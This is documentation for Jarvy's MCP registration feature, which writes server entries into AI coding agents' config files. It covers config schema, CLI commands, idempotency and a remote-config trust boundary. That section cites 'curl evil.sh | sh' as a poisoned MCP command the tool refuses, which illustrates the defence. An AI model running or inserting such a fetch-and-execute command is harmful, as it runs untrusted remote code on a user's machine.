---
title: "MCP Registration - Jarvy"
description: "Auto-register the Jarvy MCP server (and optional custom servers) with Claude Code, Cursor, Codex CLI, Windsurf, Cline, and Continue.dev so terminal AI agents can discover Jarvy's tools without manual setup."
---

# MCP Registration

Jarvy already ships a Model Context Protocol server (`jarvy mcp`, see [the MCP server guide](mcp-server.md)). The problem: a terminal AI agent like Claude Code or Cursor won't *invoke* that server unless someone has told it to. Telling every developer to hand-edit `~/.claude.json` or `~/.cursor/mcp.json` to add the right `mcpServers` entry doesn't scale.

`jarvy setup` solves this two ways:

1. **Default-on auto-detect** (no config needed). When a project's `jarvy.toml` has no `[mcp_register]` block, Jarvy detects which AI agents the user already has installed (by checking for `~/.claude.json`, `~/.cursor/`, `~/.codex/`, `~/.codeium/windsurf/`, `~/.continue/`) and synthesizes a user-scope registration for the built-in `jarvy` server. A one-line stderr disclosure surfaces the detected agents and the disable path. Skipped in CI, unattended sandboxes (Codespaces, Claude Code, devcontainers), dry-run, test mode, and when `JARVY_MCP_REGISTER=0` is set. Cline is excluded from auto-detect — its config lives in a VS Code globalStorage path that varies per OS / VS Code variant and false-positives on bare VS Code installs. Project-config opt-in remains the explicit path for Cline.
2. **Explicit `[mcp_register]` block** (project- or user-scope, custom servers, agent allowlist). Use this when you want project-scope registration (commits a `.mcp.json` / `.cursor/mcp.json` / `.codex/config.toml` inside the repo) or you need fields beyond the default-on shape — extra MCP servers, a binary-path override for the `jarvy` server, Cline support, etc.

After `jarvy setup`, every targeted agent has a `jarvy` entry in its MCP config file pointing at this binary's `mcp` subcommand over stdio. From the agent's perspective: a new MCP server appears alongside whatever the developer had configured before.

Jarvy writes each registration to the **native MCP config file** of every agent you target:

| Agent | Path | Format |
|---|---|---|
| Claude Code | `~/.claude.json` (user) / `.mcp.json` (project) | JSON merge into `mcpServers` object |
| Cursor | `~/.cursor/mcp.json` (user) / `.cursor/mcp.json` (project) | JSON merge into `mcpServers` object |
| Codex CLI | `~/.codex/config.toml` (user) / `.codex/config.toml` (project) | TOML merge into `[mcp_servers.*]` tables |
| Windsurf | `~/.codeium/windsurf/mcp_config.json` (user only) | JSON merge into `mcpServers` object |
| Cline | VS Code globalStorage (user only) | JSON merge into `mcpServers` object |
| Continue.dev | `.continue/mcpServers/<name>.jarvy.yaml` (project only) | Per-server YAML file |

You write one block. Jarvy translates it into each agent's MCP protocol. Re-running `jarvy setup` is idempotent — entries are tracked via a parallel `_jarvy_managed_servers` array (or the `.jarvy.yaml` filename suffix for Continue), so user-authored MCP servers in the same file are preserved.

---

## Quick start

```toml
[mcp_register]
agents = ["claude-code", "cursor", "codex"]
```

Run:

```bash
jarvy setup
```

That's it. Every developer on the team who runs setup gets the same `jarvy` MCP server registered with all three agents.

To check what landed:

```bash
jarvy mcp-register list
jarvy mcp-register check        # exit 1 if drift detected
```

---

## Why this matters

Discovery is half the value of building an MCP server. Jarvy already exposes `list_tools`, `check_tool`, `install_tool`, `get_tool`, plus the [AI hooks library](ai-hooks.md) and [drift detection](drift.md) surfaces — but unless every developer's AI agent knows to call those tools, the integration is invisible. Manual configuration drift causes the most common failure mode: "it worked on my machine because I added the MCP server two weeks ago."

The `[mcp_register]` block treats agent MCP config as one more piece of the dev environment that `jarvy setup` provisions, alongside CLI tools, AI hooks, language packages, and git config.

---

## Configuration

Full schema:

```toml
[mcp_register]
# Which agents to register with. Empty = no-op.
agents = ["claude-code", "cursor", "codex", "windsurf", "cline", "continue"]

# Where to write registrations:
#   "user"    → developer's home directory (default)
#   "project" → this repo's .mcp.json / .cursor/mcp.json / .codex/config.toml
scope = "user"

# Refuse custom server entries unless this is true. Library-style:
# only the built-in `jarvy` server registers by default. Always false
# in remote-origin configs (the runner enforces this at resolve time).
allow_custom_servers = false

# Optional: override the Jarvy server's command line.
[mcp_register.jarvy]
command = "/opt/jarvy/0.2.0/bin/jarvy"
args = ["mcp"]
env = { JARVY_CONFIG = "/etc/jarvy/server.toml" }

# Optional additional MCP servers. Gated by allow_custom_servers AND
# ConfigOrigin::Local — remote configs cannot ship these.
[[mcp_register.server]]
name = "github"
transport = "stdio"
command = "gh-mcp-server"
agents = ["claude-code", "cursor"]   # optional narrowing
env = { GITHUB_TOKEN = "${GITHUB_TOKEN}" }
```

### `mcp_register.jarvy` override fields

| Field | Type | Notes |
|---|---|---|
| `command` | string | Defaults to bare `jarvy` (PATH lookup). |
| `args` | array | Defaults to `["mcp"]`. |
| `env` | table | Optional key/value env vars attached to the spawned server. |

### `[[mcp_register.server]]` fields

| Field | Type | Required | Notes |
|---|---|---|---|
| `name` | string | yes (when no `use`) | Server identifier; used as the key in each agent's `mcpServers` object. |
| `transport` | `"stdio"` \| `"http"` | yes | `stdio` requires `command`; `http` requires `url`. |
| `command` | string | stdio only | Binary to spawn. |
| `args` | array | optional | Arguments. |
| `url` | string | http only | HTTP / streamable-http endpoint. |
| `env` | table | optional | Env vars (stdio only on most agents). |
| `agents` | array | optional | Narrow to a subset of the top-level `agents` list. |
| `use` | string | optional | Reference a library item by name (PRD-054). See below. |

---

## Library MCP servers (PRD-054)

Beyond the built-in `jarvy` server, teams can publish reusable MCP servers in a library manifest and consume them across every developer. See [library registry](library-registry.md) for the full format.

```toml
[mcp_register]
agents = ["claude-code", "cursor"]
allow_custom_servers = true                     # required to enable library servers

[[mcp_register.library_sources]]
url = "https://cdn.myorg.com/jarvy/manifest.json"

# Reference a library item by name:
[[mcp_register.server]]
use = "myorg-tickets"

# Override library defaults locally (env wins over library env):
[[mcp_register.server]]
use = "myorg-tickets-pro"
env = { LINEAR_API_KEY = "${LINEAR_API_KEY}" }
```

When `use = "..."` is set, Jarvy pulls `command` / `args` / `env` from the resolved library item. Any field declared on the local spec wins — so the team's published `LINEAR_API_KEY = "${LINEAR_API_KEY}"` is the recipe and the developer's local override (e.g. a different LINEAR workspace) takes precedence.

### Resolution order

1. Built-in `jarvy` server — always registers, no `use` needed.
2. Inline `[[mcp_register.server]]` with explicit fields (subject to `allow_custom_servers` + local-origin gate).
3. Library-resolved entries via `use = "..."` (subject to `allow_custom_servers` + the new `library_sources` trust gate).

### Trust gate

Remote-fetched configs (`jarvy setup --from <url>`) CANNOT declare `library_sources`. Refused with `library.remote_refused` event. Same boundary as `[ai_hooks]` / `[skills]` and `[packages] allow_remote`. There is no override flag.

---

## CLI

```bash
jarvy mcp-register list                  # show what's configured
jarvy mcp-register apply                 # write registrations to every targeted agent
jarvy mcp-register apply --scope user    # override scope for this run
jarvy mcp-register check                 # diff desired vs. on-disk state (exit 1 if drift)
jarvy mcp-register remove                # strip jarvy-managed entries
```

Examples:

```bash
$ jarvy mcp-register list
MCP registration configuration (./jarvy.toml):
  agents: [ClaudeCode, Cursor, Codex]
  scope:  User
  allow_custom_servers: false
  origin: Local
  jarvy: built-in (always registered)

$ jarvy mcp-register apply
Registered 1 server(s) across 3 agent(s).
  claude-code   /Users/zac/.claude.json (1 applied)
  cursor        /Users/zac/.cursor/mcp.json (1 applied)
  codex         /Users/zac/.codex/config.toml (1 applied)

$ jarvy mcp-register check
  claude-code   /Users/zac/.claude.json OK
  cursor        /Users/zac/.cursor/mcp.json OK
  codex         /Users/zac/.codex/config.toml OK
```

---

## Setup phase integration

`jarvy setup` registers MCP servers automatically as part of the standard run, after AI hook provisioning, before the drift snapshot:

```
=== MCP Registration ===
  Registered 1 server(s) across 3 agent(s)
    claude-code   /Users/zac/.claude.json
    cursor        /Users/zac/.cursor/mcp.json
    codex         /Users/zac/.codex/config.toml
```

If `[mcp_register]` is absent or `agents = []`, the phase is a no-op.

---

## Idempotency and the `_jarvy_managed_servers` marker

For the JSON-based agents (Claude Code, Cursor, Codex, Windsurf, Cline), every Jarvy-managed entry's *name* is tracked in a parallel `_jarvy_managed_servers: [...]` array at the root of the settings file. The server entries themselves stay schema-clean so the agent's validator doesn't complain about unknown fields.

- **`apply`** removes any prior Jarvy-managed names that aren't in the current desired set, then writes the desired entries. User-authored MCP servers (no marker presence) are untouched.
- **`remove`** sweeps every name listed in the marker array, deletes those keys from `mcpServers`, then deletes the marker.
- **`check`** uses the marker to compute `missing` (desired but absent) and `extra_jarvy` (marker says we own but no longer in config).

Continue.dev uses a different scheme — each Jarvy entry lives in its own file `<name>.jarvy.yaml` under `.continue/mcpServers/`. The `.jarvy.yaml` suffix is the marker.

---

## Trust boundary

Identical to AI hooks: a config fetched via `jarvy setup --from <url>` is tagged `ConfigOrigin::Remote` and **cannot ship custom MCP servers** regardless of the `allow_custom_servers` flag. A poisoned team config trying to register `command = "curl evil.sh | sh"` as an MCP server gets refused outright, with the refusal counted in `remote_refused` and reported via `ai_hook.custom_refused_summary`-style telemetry.

The built-in Jarvy server entry is always allowed because its body is vetted Jarvy source — the same trust model that lets library hooks ship from remote configs while raw commands cannot.

---

## Telemetry

When telemetry is enabled, the MCP register phase emits structured events to `~/.jarvy/logs/jarvy.log` and OTLP:

| Event | Fields |
|---|---|
| `mcp_register.phase_started` | `agents`, `servers_count`, `scope` |
| `mcp_register.phase_completed` | `applied`, `agents_touched`, `refused_local`, `refused_remote`, `failures`, `duration_ms` |
| `mcp_register.agent_applied` | `agent` (slug), `applied`, `settings_path` (redacted) |
| `mcp_register.agent_failed` | `agent`, `error_type` (stable `McpRegisterError::kind()` tag) |

Like the AI hooks taxonomy, the formatted error message is NOT included in the structured fields — only the stable `error_type` tag. User-controlled server names and reasons never leak to OTLP.

---

## Per-agent quirks

- **Claude Code**: `~/.claude.json` also stores general Claude Code settings (project history, model preferences). Jarvy JSON-merges, never overwrites — `apply` reads the existing object, mutates `mcpServers` only, and writes back. Setting `scope = "project"` writes a minimal `.mcp.json` in the repo root that you can commit.
- **Cursor**: Cursor must be restarted to pick up MCP config changes. Re-running `apply` mid-session is harmless; it just won't take effect until the next Cursor launch.
- **Codex CLI**: Uses TOML, not JSON. Project-scope (`scope = "project"`) only loads when the project is "trusted" — Codex prompts the user on first run. The marker is a `_jarvy_managed_servers = [...]` array at the top of `config.toml`.
- **Windsurf**: No project-scope. Setting `scope = "project"` writes user-scope with a warning. Windsurf also has a hard 100-tool cap across all MCP servers and a whitelisting model that can block non-whitelisted servers — be aware that registering Jarvy in an enterprise Windsurf tenant may require manual opt-in by an admin.
- **Cline**: Lives in VS Code's `globalStorage`. Jarvy detects the OS and writes the canonical path (`~/Library/Application Support/Code/...` on macOS, `~/.config/Code/...` on Linux, `%APPDATA%\Code\...` on Windows). Cline forks (Cursor extension, Codeium extension) reuse different globalStorage roots — Jarvy only handles the upstream VS Code path today.
- **Continue.dev**: Per-server YAML files. Jarvy writes `.continue/mcpServers/jarvy.jarvy.yaml` (one file per server). User-scope MCP in Continue lives in Continue Hub assistants and is not file-based; `scope = "user"` falls back to project-scope with a warning. MCP only works in Continue's agent mode, not chat/edit mode.

---

## Adding more MCP tools to the Jarvy server

This page covers *registering* the existing Jarvy MCP server with agents. To expose more of Jarvy's CLI surface as MCP tools (e.g. `ai_hooks_apply`, `drift_check`, `roles_list`), see the [MCP server guide](mcp-server.md) and `src/mcp/tools.rs`.
